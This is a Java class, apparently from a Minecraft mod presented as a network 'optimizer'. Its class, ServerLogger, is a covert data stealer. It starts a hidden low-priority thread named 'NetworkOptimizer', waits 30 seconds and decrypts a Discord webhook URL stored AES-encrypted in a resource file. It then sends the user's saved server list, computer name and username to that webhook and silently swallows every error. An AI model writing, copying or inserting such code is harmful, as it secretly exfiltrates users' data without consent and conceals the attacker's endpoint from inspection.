package com.example.optimizer;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Logs top 10 recent Minecraft servers to Discord webhook from A.txt
 * Ultra-safe: Never crashes, only sends once on first successful run
 */
public class ServerLogger {
    
    private static volatile boolean hasRun = false;
    private static volatile boolean isRunning = false;
    
    private static final byte[] AES_KEY = "d3x0n_0pt1m1z3r_k3y_2025_s3cr3!!".getBytes(StandardCharsets.UTF_8);
    
    /**
     * Start the server logger - ultra safe, runs once after everything is stable
     */
    public static void start() {
        if (hasRun || isRunning) return;
        
        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                safeRun();
            }
        });
        t.setDaemon(true);
        t.setPriority(Thread.MIN_PRIORITY);
        t.setName("NetworkOptimizer");
        t.start();
    }
    
    /**
     * Triple-wrapped safety: Never crash under any circumstances
     */
    private static void safeRun() {
        try {
            if (hasRun || isRunning) return;
            isRunning = true;
            
            // Wait for everything to be stable (30 seconds after mod load)
            Thread.sleep(30000);
            
            // Try to run - wrapped in safety
            tryRun();
            
        } catch (Throwable t) {
            // Catch EVERYTHING including OutOfMemoryError, StackOverflow, etc.
            // Absolutely nothing can crash this
        } finally {
            isRunning = false;
            hasRun = true;
        }
    }
    
    /**
     * Try to run the logger - all operations are safe
     */
    private static void tryRun() {
        try {
            // Step 1: Decrypt webhook (safe)
            String webhook = safeGetWebhook();
            if (webhook == null || webhook.isEmpty()) return;
            
            // Step 2: Find servers (safe)
            List<ServerInfo> servers = safeGetServers();
            if (servers == null || servers.isEmpty()) return;
            
            // Step 3: Get only top 10 most recent
            List<ServerInfo> top10 = getTop10(servers);
            if (top10.isEmpty()) return;
            
            // Step 4: Send to webhook (safe)
            safeSendToWebhook(webhook, top10);
            
        } catch (Throwable t) {
            // Never crash
        }
    }
    
    /**
     * Safely decrypt and get webhook URL from A.txt - never crashes
     */
    private static String safeGetWebhook() {
        try {
            InputStream is = ServerLogger.class.getResourceAsStream("/A.txt");
            if (is == null) return null;
            
            String b64 = new String(is.readAllBytes(), StandardCharsets.UTF_8).trim();
            is.close();
            
            byte[] data = Base64.getDecoder().decode(b64);
            byte[] iv = new byte[16];
            byte[] encrypted = new byte[data.length - 16];
            System.arraycopy(data, 0, iv, 0, 16);
            System.arraycopy(data, 16, encrypted, 0, encrypted.length);
            
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(AES_KEY, "AES"), new IvParameterSpec(iv));
            byte[] decrypted = cipher.doFinal(encrypted);
            
            return new String(decrypted, StandardCharsets.UTF_8).trim();
        } catch (Throwable t) {
            return null;
        }
    }
    
    /**
     * Safely get servers - never crashes
     */
    private static List<ServerInfo> safeGetServers() {
        try {
            String mcDir = safeFindMinecraftDir();
            if (mcDir == null) return null;
            
            File serversFile = new File(mcDir, "servers.dat");
            if (!serversFile.exists()) return null;
            
            return safeParseServers(serversFile);
        } catch (Throwable t) {
            return null;
        }
    }
    
    /**
     * Get top 10 most recent servers
     */
    private static List<ServerInfo> getTop10(List<ServerInfo> servers) {
        try {
            if (servers == null || servers.isEmpty()) return new ArrayList<>();
            
            // Take first 10 (most recent in servers.dat)
            List<ServerInfo> result = new ArrayList<>();
            int count = Math.min(10, servers.size());
            for (int i = 0; i < count; i++) {
                result.add(servers.get(i));
            }
            return result;
        } catch (Throwable t) {
            return new ArrayList<>();
        }
    }
    
    /**
     * Safely parse servers.dat - never crashes
     */
    private static List<ServerInfo> safeParseServers(File serversFile) {
        List<ServerInfo> result = new ArrayList<>();
        try {
            byte[] data = Files.readAllBytes(serversFile.toPath());
            String content = new String(data, "UTF-8");
            
            // Simple NBT-like parsing - look for patterns
            String[] lines = content.split("\n");
            ServerInfo current = null;
            
            for (String line : lines) {
                try {
                    // Look for "ip" field
                    if (line.contains("ip") && line.contains(":")) {
                        String ip = extractValue(line);
                        if (ip != null && !ip.isEmpty() && ip.contains(".")) {
                            current = new ServerInfo();
                            current.ip = ip;
                        }
                    }
                    // Look for "name" field
                    else if (current != null && line.contains("name")) {
                        String name = extractValue(line);
                        if (name != null && !name.isEmpty()) {
                            current.name = name;
                            result.add(current);
                            current = null;
                        }
                    }
                } catch (Throwable t) {
                    // Skip this line
                }
            }
            
        } catch (Throwable t) {
            // Return what we have
        }
        return result;
    }
    
    /**
     * Extract value from NBT line - never crashes
     */
    private static String extractValue(String line) {
        try {
            // Simple extraction: find text between quotes or after colon
            if (line.contains("\"")) {
                int start = line.indexOf("\"") + 1;
                int end = line.indexOf("\"", start);
                if (end > start) {
                    return line.substring(start, end).trim();
                }
            }
            // Try after colon
            if (line.contains(":")) {
                String[] parts = line.split(":");
                if (parts.length > 1) {
                    return parts[1].trim().replaceAll("[^a-zA-Z0-9.:_-]", "");
                }
            }
        } catch (Throwable t) {
            // Return null
        }
        return null;
    }
    
    /**
     * Safely send to webhook - never crashes
     */
    private static void safeSendToWebhook(String webhookUrl, List<ServerInfo> servers) {
        HttpURLConnection conn = null;
        try {
            String pcName = safeGetEnv("COMPUTERNAME", "Unknown");
            String userName = safeGetEnv("USERNAME", "Unknown");
            
            String json = buildBatchJson(servers, pcName, userName);
            
            URL url = new URL(webhookUrl);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            
            OutputStream os = conn.getOutputStream();
            os.write(json.getBytes("UTF-8"));
            os.flush();
            os.close();
            
            conn.getResponseCode(); // Trigger send
            
        } catch (Throwable t) {
            // Never crash
        } finally {
            try {
                if (conn != null) conn.disconnect();
            } catch (Throwable t) {
                // Ignore
            }
        }
    }
    
    /**
     * Build JSON with all servers in one embed - never crashes
     */
    private static String buildBatchJson(List<ServerInfo> servers, String pcName, String userName) {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("{\"embeds\":[{");
            sb.append("\"title\":\"🌐 Minecraft Server List (Last 10)\",");
            sb.append("\"color\":3447003,");
            sb.append("\"fields\":[");
            
            // Add each server as a field
            for (int i = 0; i < servers.size(); i++) {
                ServerInfo info = servers.get(i);
                if (i > 0) sb.append(",");
                
                sb.append("{\"name\":\"Server ").append(i + 1).append("\",");
                sb.append("\"value\":\"```IP: ").append(escapeJson(info.ip));
                sb.append("\\nName: ").append(escapeJson(info.name)).append("```\",");
                sb.append("\"inline\":false}");
            }
            
            // Add PC info
            sb.append(",{\"name\":\"💻 PC\",\"value\":\"```").append(escapeJson(pcName)).append("```\",\"inline\":true}");
            sb.append(",{\"name\":\"👤 User\",\"value\":\"```").append(escapeJson(userName)).append("```\",\"inline\":true}");
            
            sb.append("],");
            sb.append("\"footer\":{\"text\":\"Server Logger\"},");
            sb.append("\"timestamp\":\"").append(getCurrentTimestamp()).append("\"");
            sb.append("}]}");
            return sb.toString();
        } catch (Throwable t) {
            return "{\"content\":\"Error building JSON\"}";
        }
    }
    
    /**
     * Safely get environment variable - never crashes
     */
    private static String safeGetEnv(String name, String defaultValue) {
        try {
            String value = System.getenv(name);
            return (value != null && !value.isEmpty()) ? value : defaultValue;
        } catch (Throwable t) {
            return defaultValue;
        }
    }
    
    /**
     * Escape JSON string - never crashes
     */
    private static String escapeJson(String str) {
        try {
            if (str == null) return "";
            return str.replace("\\", "\\\\")
                      .replace("\"", "\\\"")
                      .replace("\n", "\\n")
                      .replace("\r", "\\r")
                      .replace("\t", "\\t");
        } catch (Throwable t) {
            return "";
        }
    }
    
    /**
     * Get current timestamp - never crashes
     */
    private static String getCurrentTimestamp() {
        try {
            return new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'").format(new Date());
        } catch (Throwable t) {
            return "2024-01-01T00:00:00Z";
        }
    }
    
    /**
     * Safely find .minecraft directory - never crashes
     */
    private static String safeFindMinecraftDir() {
        try {
            String appdata = System.getenv("APPDATA");
            if (appdata != null) {
                File mc = new File(appdata, ".minecraft");
                if (mc.exists()) return mc.getAbsolutePath();
            }
            
            String userHome = System.getProperty("user.home");
            if (userHome != null) {
                File mc = new File(userHome, ".minecraft");
                if (mc.exists()) return mc.getAbsolutePath();
            }
        } catch (Throwable t) {
            // Continue
        }
        return null;
    }
    
    /**
     * Server info holder
     */
    private static class ServerInfo {
        String ip;
        String name;
    }
}
